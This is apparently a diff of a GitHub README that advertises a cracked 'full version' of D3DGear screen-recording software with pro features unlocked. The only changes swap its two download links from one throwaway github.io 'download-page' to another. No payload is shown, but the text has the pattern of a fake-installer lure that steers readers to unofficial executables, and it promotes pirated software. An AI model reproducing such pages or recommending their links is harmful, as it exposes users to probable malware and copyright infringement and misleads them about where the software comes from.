@@ -2,7 +2,7 @@
 
 D3DGear 2026 Full Version Suite is the ultimate solution for capturing your gaming sessions and desktop activities on Windows 10 and 11. This package includes all the pro features unlocked, providing a seamless experience for game recording, screen capture, and live streaming. With D3DGear, you can record high-quality videos without any performance lag, making it ideal for gamers and content creators looking to share their gameplay or create tutorials.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's New in D3DGear 2026
 
@@ -65,7 +65,7 @@ A: If you encounter problems during installation, ensure you are running the ins
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
